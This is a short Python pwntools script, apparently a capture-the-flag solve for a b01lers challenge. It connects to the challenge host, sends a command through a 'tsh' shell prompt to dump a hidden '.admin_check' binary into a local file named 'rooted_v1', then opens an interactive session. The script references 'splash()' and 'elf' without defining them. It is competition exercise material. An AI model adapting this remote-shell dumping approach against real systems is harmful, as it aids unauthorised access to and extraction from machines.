#!/usr/bin/env python3


from pwn import *

ADDR = "chal.b01lers.com"
PORT = 2007

splash()


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    io.recvuntil("tsh> ")
    io.sendline("/bin/cat /bin/.admin_check")

    binary = io.recvuntil("tsh> ")[:-5]
    with open("rooted_v1", "wb") as rooted:
        rooted.write(binary)

    io.interactive()


if __name__ == "__main__":
    solve()
